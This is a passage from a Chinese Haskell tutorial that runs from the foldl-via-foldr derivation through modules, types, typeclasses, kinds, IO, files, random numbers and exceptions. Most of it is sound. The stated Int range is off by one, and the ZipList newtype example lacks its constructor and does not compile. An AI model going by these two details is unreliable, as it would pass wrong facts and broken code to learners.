        已经变成了 foldr (…) id []
      | 而根据前面foldr的定义 foldr \_ x [] = x
        ，它应该返回id

      | 所以最后的结果：
      | (id的定义：id x = x)

      .. container:: float highlight haskell
      ::

           ...
         = (foldr (...) id xs') (f z x1)
         = (foldr (...) id xs'') (f (f z x1) x2)
         = ...
         = (foldr (...) id []) (f (.. (f z x1) ..) xn)
         = id (f (.. (f z x1) ..) xn)
         = f (.. (f z x1) ..) xn

      | 那么最后这个结果就很熟悉了，它就是 foldl f z xs。
      | 所以我们推导出了这个用foldr表示foldl的写法是正确的。


   .. rubric:: ` <#Modules>`__ Modules
      :name: Modules

      Haskell会自动加载Prelude模块（module），如果在GHCi中再加载其他模块，需要使用 ``:m + ...`` ，比如加载Data.List模块：

      Prelude> :m + Data.List

      而在hs文件中引入模块，需要使用 ``import`` 语句，下面和python的对比可以便于理解：

      .. container:: float highlight haskell
      ::

         import Data.List
         -- from Data.List import *

         import Data.List (nub, sort)
         -- from Data.List import nub, sort

         import Data.List hiding (nub)
         -- 从Data.List中引入所有，但不引入nub函数

         import qualified Data.List
         -- import Data.List

         import qualified Data.List as Li
         -- import Data.List as Li

      .. rubric:: ` <#编写Modules>`__ 编写Modules
         :name: 编写Modules

      模块中要包含将要使用的一些函数，像正常的hs文件一样写即可，但头部需要有导出语句（export）。比如一个模块文件名叫 ``ModuleA.hs`` ，那它的头部需要写：

      .. container:: float highlight haskell
      ::

         module ModuleA
         ( functionA
         , functionB
         , functionC
         ) where

      而且文件中的所有函数只导出需要使用的即可。比如该文件中还含有functionD供前三个函数内部使用，那么在import
      ModuleA之后也无法调用functionD。

      .. rubric:: ` <#Types-amp-Typeclasses>`__ Types &
         Typeclasses
         :name: Types-amp-Typeclasses

      .. rubric:: ` <#Types>`__ Types
         :name: Types

      | Haskell有一个静态类型系统，任何变量、函数都会具有类型，并且有类型判断功能，没给出的类型会自动识别。
      | Type的首字母全为大写，常用的有：

      -  ``Int`` ：整型，有上下界范围，-2147483647～2147483648
      -  ``Integer`` ：整数，无界，但是效率比Int低
      -  ``Float`` ：单精度浮点型
      -  ``Double`` ：双精度浮点型
      -  ``Bool`` ：布尔值
      -  ``Char`` ：字符
      -  ``String`` ：字符串，等同于 ``[Char]``
      -  ``Ordering`` ：大小关系，包含LT、EQ、GT，且它们有大小关系
         LT < EQ < GT

      列表的类型是由其中元素决定的，并且列表中元素必须是同一类型，所以列表的类型就是其元素类型外加 ``[]`` 。

      元组的类型由其中各个元素的类型共同决定，因为元组中的元素可以是不同类型。如(“abc”,
      ‘a’, True)的类型是([Char], Char, Bool)。


   .. rubric:: ` <#Typeclasses>`__ Typeclasses
      :name: Typeclasses

      | 类型类（Typeclass）是定义一系列功能的接口，如果一个Type属于一个Typeclass的成员，那么它可以实现这个类型类所规定的功能。一个Type也可以属于多个Typeclass
      | Typeclass的首字母也全为大写，常见的有：

      -  ``Eq`` ：可判断是否相等
      -  ``Ord`` ：可比较大小
      -  ``Show`` ：可展示成字符串
      -  ``Read`` ：可从字符串转换成特定类型
      -  ``Enum`` ：可枚举（连续），即可以使用pred和succ函数得到前驱和后缀
      -  ``Bounded``:
         有上下界，如果元组中所有元素都属于Bounded，那这个元组的类型也属于Bounded
      -  ``Integral`` ：是整数，包括Int和Integer
      -  ``RealFloat`` ： 是实浮点数，包括Float和Double
      -  ``RealFrac`` ：是实分数，包括Float、Double和Ratio（在Data.Ratio模块中）
      -  ``Floating`` ：是浮点数，包括Float、Double和Complex（在Data.Complex模块中）
      -  ``Real`` ：是实数，包括Integral和RealFrac的成员
      -  ``Fractional`` ：是分数，包括RealFrac和Floating的成员
      -  ``Num`` ：是数字，包括上述所有数字相关的类型

      .. rubric:: ` <#Type-variables>`__ Type variables
         :name: Type-variables

      如果查看一个函数的类型，比如 ``head`` ，那么将会返回以下类型：

      head :: [a] -> a

      其中的a就是一个类型变量（type
      variable），它在head中可以属于任何类型，在这里只是表示返回值的类型和输入的列表中的元素的类型相一致。

      在函数的类型表达式其实可以看作$\\lambda$表达式，它适用于$\\alpha$变换（$\\alpha$-conversion）。即a在这里可以指Int、Char等类型，也可以指[Char],
      (Int, Char), 甚至函数Int -> Int等。

      在大部分函数的类型中，类型变量需要保证是某个Typeclass的成员才能完成操作。比如 ``(==)`` 函数，它需要传入的参数是可判断相等的，即是Eq的成员，那么 ``(==)`` 的类型就是：

      (==) :: (Eq a) => a -> a -> Bool

      其中 ``=>`` 前的部分(Eq a)就是类约束（class
      constraint），它规定了a是Eq的成员，所以 ``(==)`` 函数传入的两个参数都是a类型，且都是Eq的成员，保证了它们之间是可以比较是否相等的。

      .. rubric:: ` <#定义新Type>`__ 定义新Type
         :name: 定义新Type

      定义一个新的Type需要使用 ``data`` 关键字，比如定义 ``Bool`` 需要使用：

      data Bool = False \| True

      | 其中 ``=`` 左侧的部分定义了新类型的名称 ``Bool`` ，右侧的部分叫做值构造器（value
        constructors），表示了Bool类型的值为False或True。
      | 并且名称和值构造器的首字母都需要大写。

      另外，值构造器也是函数，它们可以有参数，叫做项（field）。比如：

      .. container:: float highlight haskell
      ::

         data Shape = Circle Float Float Float | Rectangle Float Float Float Float   

      | 它定义了一个新Type叫Shape，值构造器是Circle和Rectangle，Circle接收三个参数都是Float类型，Rectangle接收四个Float类型参数。
      | 如果查看Circle的类型，将返回：

      Circle :: Float -> Float -> Float -> Shape

      如果想要让它能给直接显示出来，需要让它属于Show类型类。在代码中只需要在结尾加上 ``deriving (Show)``:

      .. container:: float highlight haskell
      ::

         data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving (Show)

      类型的名称和值构造器名称也可以相同，比如：

      .. container:: float highlight haskell
      ::

         data Point = Point Float Float deriving (Show)

      .. rubric:: ` <#导出Type>`__ 导出Type
         :name: 导出Type

      在文件中定义了新的Type之后，如果在别的文件中将其作为模块导入，则需要先导出。比如文件 ``Shapes.hs`` 中定义了Shape和Point，以及其他的一些函数，那么文件开头需要写：

      .. container:: float highlight haskell
      ::

         module Shapes
         ( Shape(..)
         , Point(..)
         , functionA
         , functionB
         ) where

      其中的 ``Shape(..)`` 导出了Shape类型和它所有的值构造器， ``..`` 代表了它的所有值构造器。因此， ``Shape(..)`` 相当于 ``Shape (Circle, Rectangle)`` 。

      如果不想要导出值构造器，即不允许使用值构造器的方法来创建Shape类型的变量。那么需要将 ``Shape(..)`` 替换为 ``Shape`` ，这样就只导出了Shape类型，而不导出其值构造器。

      .. rubric:: ` <#Record-Syntax>`__ Record Syntax
         :name: Record-Syntax

      如果想要方便地取出类型实例中的参数，可以使用Record语法，如：

      .. container:: float highlight haskell
      ::

         data Point = Point { xcoord :: Float
                            , ycoord :: Float
                            } deriving (Show)

      在值构造器的参数部分先加一个大括号，然后指定取出值的函数名称（xcoord,
      ycoord），后面指定类型（::
      Float）。这样xcoord和ycoord就都是一个类型为Point ->
      Float的函数，可以通过下面方法来访问值：

      .. container:: float highlight haskell
      ::

         ghci> let point = Point 1.0 2.0
         ghci> xcoord point
         1.0
         ghci> ycoord point
         2.0

      同时也可以通过下面方法来创建这个point：

      .. container:: float highlight haskell
      ::

         point = Point {ycoord=2.0, xcoord=1.0}

      .. rubric:: ` <#Type-parameters>`__ Type parameters
         :name: Type-parameters

      值构造器可以接收参数，类型也可以接收参数，这样它就成为了类型构造器（type
      constructors）。如Maybe的定义：

      data Maybe a = Nothing \| Just a

      | 它的值是Nothing时，类型为Maybe
        a，是多态的（polymorphic）。
      | 他的值不是Nothing时，类型取决于值Just
        a中a的类型，可以构造出Maybe Int、Maybe
        [Char]等多种类型：

      .. container:: float highlight haskell
      ::

         Nothing :: Maybe a
         Just 1 :: Num a => Maybe a
         Just 'a' :: Maybe Char
         Just "abc" :: Maybe [Char]

      可以用这种方法改写Point：

      .. container:: float highlight haskell
      ::

         data Point x y = Point { xcoord :: x
                                , ycoord :: y
                                } deriving (Show)

      但使用类型参数（type
      parameters）并不是总是方便，比如在声明函数类型的时候不能只使用Point来表示Point类型，而是必须写成Point
      Float Float。

      而且不能在定义类型构造器时添加类约束（class
      constraint），不然在之后声明函数类型的时候也都需要添加类约束，如：

      .. container:: float highlight haskell
      ::

         data (Ord k) => Map k v = ... 
         toList :: (Ord k) => Map k a -> [(k, a)]

      .. rubric:: ` <#Either>`__ Either
         :name: Either

      Either是一个类型构造器，它有两个值构造器，定义是：

      .. container:: float highlight haskell
      ::

         data Either a b = Left a | Right b deriving (Eq, Ord, Read, Show)  

      如果使用了Left，那它的a的类型就是具体的；如果使用了Right，那它的b的类型就是具体的：

      .. container:: float highlight haskell
      ::

         ghci> Right 20  
         Right 20  
         ghci> Left "w00t"  
         Left "w00t"  
         ghci> :t Right 'a'  
         Right 'a' :: Either a Char  
         ghci> :t Left True  
         Left True :: Either Bool b  

      Either可以看作Maybe的补充，比如Maybe在使用时，出现异常可以返回Nothing，但只是一个Nothing，不包含任何信息；但Either包含左值和右值，正常结果返回右值，而出现异常就可以返回包含错误信息的左值，比如安全除法：

      .. container:: float highlight haskell
      ::

         safeDiv :: Int -> Int -> Maybe Int
         safeDiv _ 0 = Nothing
         safeDiv x y = Just (x `div` y)

         ghci> safeDiv 4 2
         Just 2
         ghci> safeDiv 1 0
         Nothing

      而使用Either：

      .. container:: float highlight haskell
      ::

         safeDiv :: Int -> Int -> Either String Int
         safeDiv _ 0 = Left "Divided by zero"
         safeDiv x y = Right (x `div` y)

         ghci> safeDiv 4 2
         Right 2
         ghci> safeDiv 1 0
         Left "Divided by zero"

      .. rubric:: ` <#Derived-instances>`__ Derived
         instances
         :name: Derived-instances

      想要使一个定义的类满足某些Typeclass的需求，需要从其派生（derive），比如：

      .. container:: float highlight haskell
      ::

         data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday   
                    deriving (Eq, Ord, Show, Read, Bounded, Enum)  

      这样Day类型的值（Monday～Sunday）之间就可以比较是否相等（从Eq派生），比较大小（从Ord派生，左侧为小，右侧为大），显示成字符串（从Show派生），从字符串中读取（从Read派生），包含边界（从Bounded派生），可以枚举（从Enum派生，按照值构造器中的顺序依次向右）

      .. rubric:: ` <#Type-synonyms>`__ Type synonyms
         :name: Type-synonyms

      为了阅读方便，书写简便，可以使用 ``type`` 关键字为已有类型创建别名（synonyms）。比如String的定义：

      type String = [Char]

      | 在所有需要使用字符串（即[Char]）的地方都可以使用String来代替，它们是完全一致的，只是String更简便易读。
      | 同时，类型别名也可以接收类型参数

      .. rubric:: ` <#newtype-keyword>`__ newtype keyword
         :name: newtype-keyword

      除了 ``data`` 、 ``type`` 关键字之外，还可以用 ``newtype`` 关键字来定义一个新的类型，比如 ``Control.Applicative`` 模块中的ZipList：

      .. container:: float highlight haskell
      ::

         newtype ZipList a = { getZipList :: [a] }

      -  不同于type，它不是别名，可以使用record语法来直接定义取出值的函数
      -  不同于data，它只能有一个值构造器，但是速度要比data快，而且更加懒惰

      .. rubric:: ` <#Recursive-data-structures>`__ Recursive
         data structures
         :name: Recursive-data-structures

      一个类型也可以递归定义，比如一颗二叉树：

      .. container:: float highlight haskell
      ::

         data Tree a = EmptyTree | Node a (Tree a) (Tree a) deriving (Show, Read, Eq)  

      .. rubric:: ` <#定义新Typeclass>`__ 定义新Typeclass
         :name: 定义新Typeclass

      定义一个新的Typeclass需要使用class关键字，例如定义Eq类型类：

      .. container:: float highlight haskell
      ::

         class Eq a where  
             (==) :: a -> a -> Bool  
             (/=) :: a -> a -> Bool  
             x == y = not (x /= y)  
             x /= y = not (x == y)  

      其中 ``a`` 是一个类型变量，前两行声明了需要实现的函数的名字及其类型，后两行表明了需要的函数之间可以相互定义（不必要）。

      包含了后两行之后，只定义(==)函数或者(/=)函数都可以完成全部定义，它们（ ``(==) | (/=)`` ）成为这个类型类的最小完整定义（minimal
      complete definition）

      查看一个类型类的成员需要实现的函数可以在GHCi中使用 ``:info`` ：

      ghci> :info Eq

      .. rubric:: ` <#手动创建实例>`__ 手动创建实例
         :name: 手动创建实例

      使一个类型成为一个类型类的实例可以直接使用 ``deriving`` 来自动完成，也可以通过使用instance关键字来手动完成。比如使Point成为Show的实例：

      .. container:: float highlight haskell
      ::

         instance Show Point where
             show (Point x y) = "(" ++ show x ++ ", " ++ show y ++ ")"

         -- in ghci
         ghci> Point 1.0 2.0
         (1.0, 2.0)

      这样就可以自定义显示的内容，否则使用deriving的话只会直接将其转化为字符串。

      同时也要注意类型和类型构造器的区别，传入给instance的第二个参数应该为类型而不是类型构造器，比如Maybe：

      .. container:: float highlight haskell
      ::

         instance Eq Maybe where  
             ...    
         -- 错误用法，因为Maybe是类型构造器而不是类型

         instance Eq (Maybe m) where  
             ...
         -- 错误用法，因为m不一定是Eq的成员

         instance (Eq m) => Eq (Maybe m) where  
             Just x == Just y = x == y  
             Nothing == Nothing = True  
             _ == _ = False  

      .. rubric:: ` <#Functor-Typeclass>`__ Functor
         Typeclass
         :name: Functor-Typeclass

      Functor也是一种类型类，它只规定了一个函数：

      .. container:: float highlight haskell
      ::

         class Functor f where
             fmap :: (a -> b) -> f a -> f b

      其中 ``f`` 是一个类型构造器，而不是一个具体类型

      .. rubric:: ` <#Kinds>`__ Kinds
         :name: Kinds

      一个值的类型叫做类型（Type），而一个类型的类型叫做Kind。可以通过GHCi中 ``:k`` 来查看Kind：

      .. container:: float highlight haskell
      ::

         ghci> :k Int
         Int :: *
         ghci> :k Maybe
         Maybe :: * -> *
         ghci> :k Maybe Int
         Maybe Int :: *
         ghci> :k Either
         Either :: * -> * -> *

      其中的星号 ``*`` 代表了一个具体类型（concrete
      type）。Int本身就是一个具体类型，所以Int的Kind是\*。而Maybe是一个类型构造器，它接收一个具体类型返回一个新的具体类型，所以Maybe的Kind是\*
      -> \*。如果给Maybe传入了一个Int，那么得到的Maybe
      Int就是一个具体的类型，它的Kind就是\*。Either也是一个类型构造器，但它接收两个类型才产生一个新的类型，所以Either的Kind是\*
      -> \* -> \*。

   .. rubric:: ` <#Input-Output>`__ Input/Output
      :name: Input-Output

      .. rubric:: ` <#运行Haskell程序>`__ 运行Haskell程序
         :name: 运行Haskell程序

      不在GHCi中运行一个Haskell程序有两种方式：

      #. 编译运行：

         .. container:: float highlight sh

         ::

            $ ghc --make code
            $ ./code

      #. 通过 ``runhaskell`` 命令直接运行：

         .. container:: float highlight sh

            ::

            $ runhaskell code.hs

      .. rubric:: ` <#输出文本>`__ 输出文本
         :name: 输出文本

      在一个Haskell程序中输出文字需要定义一个main函数：

      .. container:: float highlight haskell
      ::

         main = putStrLn "Hello World"

      其中putStrLn的类型是：

      putStrLn :: String -> IO ()

      putStrLn接收一个String类型，并返回一个结果为()类型的IO动作（I/O
      action）。所以main函数的类型为IO ()。（IO的Kind是\* ->
      \*）

      除此之外，还有其他默认提供的输出文本的函数：

      -  ``putStr`` ：输出文本，结尾不换行
      -  ``putChar`` ：输出单个字符，结尾不换行。接收的参数为单个Char，不是String（用单引号不是双引号）
      -  ``print`` ：可以接收任何Show的成员，先用show转化为字符串然后输出。等同于putStrLn
         . show

      .. rubric:: ` <#do-block>`__ do block
         :name: do-block

      在main函数中使用多个putStrLn需要使用do语句：

      .. container:: float highlight haskell
      ::

         main = do
             putStrLn "Line1"
             putStrLn "Line2"

      其中最后一行一定要返回IO ()类型的值

      .. rubric:: ` <#输入文本>`__ 输入文本
         :name: 输入文本

      输入文字需要在do块中使用getLine：

      .. container:: float highlight haskell
      ::

         main = do
             line <- getLine
             putStrLn line

      getLine的类型是：

      getLine :: IO String

      而<-操作符将getLine中的String提取了出来给到了line，使line变成了String类型的一个字符串。

      而且使用输入的字符串必须要经过一次<-，不能直接使用getLine作为字符串，因为getLine不是String类型，而是IO
      String类型。

      除此之外，还可以使用getChar来获取单个字符，但仍然需要使用<-操作符来提取Char

      .. rubric:: ` <#其他IO相关函数用法>`__ 其他IO相关函数用法
         :name: 其他IO相关函数用法

      .. rubric:: ` <#return>`__ return
         :name: return

      Haskell中的return和其他命令式语言中的return完全不同，它不会使函数直接结束并返回一个值。

      main函数必须定义为类型为IO
      ()的函数，所以在main函数中使用if语句，如果不输出的话也不可以直接放下什么都不干，因为这时候main函数的类型不是IO
      ()。所以这时需要使用return ()来为main函数指定为IO
      ()类型，例如：

      .. container:: float highlight haskell
      ::

         main = do 
             line <- getLine
             if null line
                 then return () -- <-这里
                 else do
                     ...

      使用<-操作符也可以直接将return语句中的内容提取出来，比如a
      <- return ‘A’，执行后a就是’A’。

      .. rubric:: ` <#when>`__ when
         :name: when

      when包含在 ``Control.Monad`` 模块中，它表示在满足第一个参数的条件下会执行第二个函数，否则会return
      ()。比如：

      .. container:: float highlight haskell
      ::

         import Control.Monad   
           
         main = do  
             c <- getChar  
             when (c /= ' ') $ do  
                 putChar c  
                 main  

      等同于：

      .. container:: float highlight haskell
      ::

         main = do     
             c <- getChar  
             if c /= ' '  
                 then do  
                     putChar c  
                     main  
                 else return () 

      .. rubric:: ` <#sequence>`__ sequence
         :name: sequence

      sequence在IO中使用时可以达成[IO a] -> IO
      [a]的效果，所以可以用作：

      .. container:: float highlight haskell
      ::

         [a, b, c] <- sequence [getLine, getLine, getLine]

      .. rubric:: ` <#mapM-amp-mapM>`__ mapM & mapM\_
         :name: mapM-amp-mapM

      在IO相关的地方使用map，可以使用mapM和mapM\_，其中mapM有返回值而mapM_直接扔掉了返回值：

      .. container:: float highlight haskell
      ::

         ghci> mapM print [1,2,3]  
         1  
         2  
         3  
         [(),(),()]  
         ghci> mapM_ print [1,2,3]  
         1  
         2  
         3  

      .. rubric:: ` <#forever>`__ forever
         :name: forever

      forever函数包含在 ``Control.Monad`` 模块中。在main函数开头加上forever函数可以使后面的do块一直重复执行直到程序被迫终止，如：

      .. container:: float highlight haskell
      ::

         import Control.Monad
           
         main = forever $ do
             ...

      .. rubric:: ` <#forM>`__ forM
         :name: forM

      forM函数包含在 ``Control.Monad`` 模块中，它的功能和mapM类似，从第一个参数中逐个取出元素传入第二个参数（一个接收一个参数的函数）中，并且第二个参数可以返回IO
      a类型。比如：

      .. container:: float highlight haskell
      ::

         import Control.Monad

         main = do 
             colors <- forM [1, 2, 3, 4] (\a -> do
                 putStrLn $ "Which color do you associate with the number " ++ show a ++ "?"  
                 color <- getLine  
                 return color)
             putStrLn "The colors that you associate with 1, 2, 3 and 4 are: "  
             mapM putStrLn colors

      .. rubric:: ` <#getContents>`__ getContents
         :name: getContents

      getLine获取一整行，而getContents从标准输入中获取全部内容直到遇到EOF，并且它是lazy的，在执行了foo
      <-
      getContents后，它并不会读取标准输入并且赋值到foo，而是等到需要使用foo的时候再从标准输入读取。

      getContents在使用管道传入文字时很常用，可以代替forever+getLine使用，比如一个Haskell程序文件code.hs：

      .. container:: float highlight haskell
      ::

         import Data.Char  
           
         main = do  
             contents <- getContents  
             putStr (map toUpper contents)  

      使用ghc –make code编译后，通过管道传入文字：

      .. container:: float highlight sh

      ::

         cat text.txt | ./code

      会将text.txt中的所有字母转为大写并输出

      .. rubric:: ` <#interact>`__ interact
         :name: interact

      上述功能还可以转化为一个String -> String的函数：

      .. container:: float highlight haskell
      ::

         upperStrings = unlines . map (map toUpper) . lines

      而在main中使用这个函数就需要：

      .. container:: float highlight haskell
      ::

         main = do
             contents <- getContents
             putStr (upperStrings contents)

      但是String ->
      String类型的函数在输入输出中的使用太常见了，所以可以使用interact函数来简化。interact的类型是：

      interact :: (String -> String) -> IO ()

      可以看出它接收一个String -> String的函数，并返回一个IO
      ()类型，所以可以直接用在main上。

      于是整个转换为大写的程序就可以简化为：

      .. container:: float highlight haskell
      ::

         main = interact $ unlines . map (map toUpper) . lines

      .. rubric:: ` <#文件和流>`__ 文件和流
         :name: 文件和流

      以下与文件和流相关的函数都包含在 ``System.IO`` 模块中

      .. rubric:: ` <#openFile>`__ openFile
         :name: openFile

      openFile函数可以用来打开一个文件，它的类型是：

      openFile :: FilePath -> IOMode -> IO Handle

      其中 ``FilePath`` 是String的type
      synonyms，用一个字符串来表示需要打开的文件的路径

      ``IOMode`` 的定义是：

      .. container:: float highlight haskell
      ::

         data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode

      所以它一共只有四个值，用来表示进行IO操作的模式

      openFile返回一个IO
      Handle类型的值，将其用<-操作符提取后会出现一个Handle的值。但不能从Handle中直接使用文字，还需要使用一系列函数：

      -  ``hGetContents`` :: Handle -> IO String
         ，从Handle中读取全部内容，返回一个IO String
      -  ``hGetChar`` :: Handle -> IO Char
         ，从Handle中读取一个字符
      -  ``hGetLine`` :: Handle -> IO String
         ，从Handle中读取一行，返回一个IO String
      -  ``hPutStr`` :: Handle -> String -> IO ()
         ，向Handle中输出字符串
      -  ``hPutStrLn`` :: Handle -> String -> IO () ，同上

      在使用openFile进行文件操作后，需要使用hClose手动关闭Handle。hClose
      :: Handle -> IO ()，接收一个Handle并返回IO
      ()，可以直接放在main函数末尾

      所以使用openFile读取一个文件中的全部内容并输出的全部代码是：

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             handle <- openFile "text.txt" ReadMode
             contents <- hGetContents handle
             putStrLn contents
             hClose handle

      .. rubric:: ` <#withFile>`__ withFile
         :name: withFile

      withFile类似Python中的with
      open，它在读取文件使用之后不需要手动close文件。它的类型是：

      withFile :: FilePath -> IOMode -> (Handle -> IO a) ->
      IO a

      可以看出，它接收三个参数：

      -  ``FilePath`` ：一个表示文件路径的String
      -  ``IOMode`` ：打开文件的模式
      -  ``(Handle -> IO a)`` ：一个函数，表示对读取文件后的Handle索要进行的操作，需要返回一个I/O
         action；而这个返回值也将作为withFile的返回值

      现在使用withFile来改写上述代码：

      .. container:: float highlight haskell
      ::

         import System.IO

         main = withFile "text.txt" ReadMode (\handle -> do
             contents <- hGetContents handle
             putStrLn contents)

      withFile的功能相当于以下函数：

      .. container:: float highlight haskell
      ::

         withFile' :: FilePath -> IOMode -> (Handle -> IO a) -> IO a  
         withFile' path mode f = do  
             handle <- openFile path mode   
             result <- f handle  
             hClose handle  
             return result  

      .. rubric:: ` <#readFile>`__ readFile
         :name: readFile

      readFile可以更加简化读取文件内容的操作，它的类型：

      readFile :: FilePath -> IO String

      它只需要输入一个表示文件路径的字符串，返回其中以其中内容为内容的I/O
      action：

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             contents <- readFile "text.txt"
             putStrLn contents

      .. rubric:: ` <#writeFile>`__ writeFile
         :name: writeFile

      writeFile简化了写入文件的操作，它的类型：

      writeFile :: FilePath -> String -> IO ()

      传入的第一个参数是要写入的文件的路径，第二个参数是要写入的字符串，返回一个IO
      ()

      .. rubric:: ` <#appendFile>`__ appendFile
         :name: appendFile

      appendFile类似writeFile，但使用它不会覆盖文件中原来内容，而是直接把字符串添加到文件末尾

      .. rubric:: ` <#buffer>`__ buffer
         :name: buffer

      文件以流的形式被读取，默认文字文件的缓冲区（buffer）大小是一行，即每次读取一行内容；默认二进制文件的缓冲区大小是以块为单位，如果没有指定则根据系统默认来选择。

      也可以通过 ``hSetBuffering`` 函数来手动设置缓冲区大小，这个函数的类型：

      hSetBuffering :: Handle -> BufferMode -> IO ()

      它接收一个handle，和一个BufferMode，并返回IO
      ()。其中BufferMode有以下几种：

      -  ``NoBuffering`` ：没有缓冲区，一次读入一个字符
      -  ``LineBuffering`` ：缓冲区大小是一行，即每次读入一行内容
      -  ``BlockBuffering (Maybe Int)`` ：缓冲区大小是一块，块的大小由Maybe
         Int指定：

         -  ``BlockBuffering (Nothing)`` ：使用系统默认的块大小
         -  ``BlockBuffering (Just 2048)`` ：一块的大小是2048字节，即每次读入2048bytes的内容

      缓冲区的刷新是自动的，也可以通过 ``hFlush`` 来手动刷新

      hFlush :: Handle -> IO ()

      传入一个handle，返回IO ()，即刷新对应handle的缓冲区

      .. rubric:: ` <#openTempFile>`__ openTempFile
         :name: openTempFile

      openTempFile可以新建一个临时文件：

      openTempFile :: FilePath -> String -> IO (FilePath,
      Handle)

      ``FilePath`` 指临时文件要创建的位置路径， ``String`` 指临时文件名字的前缀，返回一个I/O
      action，其内容第一个 ``FilePath`` 是创建得到的临时文件的路径， ``Handle`` 是临时文件的handle

      例如：

      .. container:: float highlight haskell
      ::

         import System.IO

         main = do
             (tempFile, tempHandle) <- openTempFile "." "temp"
             ...
             hClose tempHandle

      ``"."`` 指临时文件要在当前目录创建， ``"temp"`` 指临时文件名字以temp开头。最终得到的tempFile就是./temp…….，temp后为随机数字，如 ``./temp43620-0``

      .. rubric:: ` <#路径操作>`__ 路径操作
         :name: 路径操作

      相关函数都包含在 ``System.Directory`` 模块中，全部内容见 `System.Directory <https://hackage.haskell.org/package/directory-1.3.6.2/docs/System-Directory.html>`__

      .. rubric:: ` <#getCurrentDirectory>`__ getCurrentDirectory
         :name: getCurrentDirectory

      getCurrentDirectory :: IO FilePath

      直接返回一个I/O
      action，其内容是一个字符串表示当前路径的绝对路径

      .. rubric:: ` <#removeFile>`__ removeFile
         :name: removeFile

      removeFile :: FilePath -> IO ()

      输入一个文件路径，并删除掉它

      .. rubric:: ` <#renameFile>`__ renameFile
         :name: renameFile

      renameFile :: FilePath -> FilePath -> IO ()

      输入一个原路径，一个新路径，为原路径的文件重命名为新路径的名

      .. rubric:: ` <#doesFileExist>`__ doesFileExist
         :name: doesFileExist

      doesFileExist :: FilePath -> IO Bool

      检查文件是否存在，返回一个包含布尔值的I/O action

      .. rubric:: ` <#Command-line-arguments>`__ Command
         line arguments
         :name: Command-line-arguments

      ``System.Environment`` 模块中提供了两个函数可以用来处理传入命令行的参数

      .. rubric:: ` <#getArgs>`__ getArgs
         :name: getArgs

      getArgs :: IO [String]

      不需要输入参数，直接返回一个I/O
      action，内容为传入命令行的参数（一个由String组成的列表）。相当于C语言中的argv[1:]

      .. rubric:: ` <#getProgName>`__ getProgName
         :name: getProgName

      getProgName :: IO String

      返回I/O
      action，内容为程序的名字，相当于C语言中的argv[0]

      .. rubric:: ` <#Randomness>`__ Randomness
         :name: Randomness

      和随机数有关的函数都包含在 ``System.Random`` 模块中。GHCi启动时可能不会包含System.Random的配置，导致无法找到模块。需要通过stack打开:

      .. container:: float highlight sh

      ::

         stack ghci --package random

      Haskell要求同样的程序需要运行出同样的结果，除了用到了I/O
      action，所有会造成不同结果的函数都要交给I/O
      action来完成

      那要使随机数脱离IO存在，就要用到随机生成器（random
      generator）

      ``System.Random`` 模块提供了几个生成随机数的函数：

      .. rubric:: ` <#random>`__ random
         :name: random

      random :: (Random a, RandomGen g) => g -> (a, g)

      其中又有两个新的typeclass，Random表示可以取随机，RandomGen表示随机数生成器。random函数接收一个随机数生成器，返回一个元组，其中第一个元素是生成的随机数，第二个元素是一个新的随机数生成器

      获取随机数生成器可以使用 ``mkStdGen`` 函数：

      mkStdGen :: Int -> StdGen

      其中 ``StdGen`` 是一个RandomGen的实例

      运用random生成随机数需要指定类型，不然程序无法确定 ``a`` 是什么类型。例如：

      .. container:: float highlight haskell
      ::

         ghci> random (mkStdGen 100) :: (Int, StdGen)
         (9216477508314497915,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})
         ghci> random (mkStdGen 100) :: (Char, StdGen)
         ('\537310',StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})
         ghci> random (mkStdGen 100) :: (Bool, StdGen)
         (True,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125})

      再次运行同样的函数，会得到同样的结果。所以如果需要生成其他的随机数，需要更换生成器，就可以使用上一次调用结果返回的新随机数生成器：

      .. container:: float highlight haskell
      ::

         threeCoins :: StdGen -> (Bool, Bool, Bool)  
         threeCoins gen =   
             let (firstCoin, newGen) = random gen  
                 (secondCoin, newGen') = random newGen  
                 (thirdCoin, newGen'') = random newGen'  
             in  (firstCoin, secondCoin, thirdCoin) 

      .. rubric:: ` <#randoms>`__ randoms
         :name: randoms

      randoms :: (Random a, RandomGen g) => g -> [a]

      randoms接收一个RandomGen，返回一个随机的无穷列表。因为它是无穷的，所以不会返回新的随机数生成器

      .. rubric:: ` <#randomR>`__ randomR
         :name: randomR

      randomR :: (Random a, RandomGen g) => (a, a) -> g ->
      (a, g)

      可以用来生成有范围的随机数，第一个参数是一个元组，表示生成随机数的范围(闭区间)

      .. rubric:: ` <#randomRs>`__ randomRs
         :name: randomRs

      randomRs :: (Random a, RandomGen g) => (a, a) -> g ->
      [a]

      同上两个，生成有范围的无穷随机数列表

      .. rubric:: ` <#getStdGen>`__ getStdGen
         :name: getStdGen

      如果想要让程序每次运行得到不同的随机结果，需要使用 ``getStdGen`` 来获取全局随机数生成器，它会在每次运行的时候产生不同的值，也因此，它返回的是一个I/O
      action，而不是一个直接的StdGen

      getStdGen :: Control.Monad.IO.Class.MonadIO m => m
      StdGen

      即可以看成getStdGen :: IO
      StdGen，需要使用<-操作符将StdGen提取出来

      但是在同一个程序中，getStdGen的结果是相同的，全局随机数生成器不会自动更新，所以就需要另一个函数newStdGen

      .. rubric:: ` <#newStdGen>`__ newStdGen
         :name: newStdGen

      newStdGen :: Control.Monad.IO.Class.MonadIO m => m
      StdGen

      执行newStdGen会进行两个操作：

      -  更新全局随机数生成器，下次执行getStdGen会获得不同的结果
      -  返回一个I/O
         action，包含一个新的StdGen（但是这个生成器和全局生成器也不同）

      .. rubric:: ` <#Exceptions>`__ Exceptions
         :name: Exceptions

      程序在运行失败时会抛出异常，可以通过 ``Control.Exception`` 模块中的 ``catch`` 函数来捕获异常：

      catch :: Exception e => IO a -> (e -> IO a) -> IO a

      第一个参数是要进行的操作，以IO
      a为返回值的类型，第二个参数是一个函数，它接收异常并进行操作，例如：

      .. container:: float highlight haskell
      ::

         import Control.Exception

         main = main' `catch` handler

         main' :: IO ()
         main' = do
             ...

         handler :: Exception e => e -> IO ()
         handler e =  putStrLn "..."

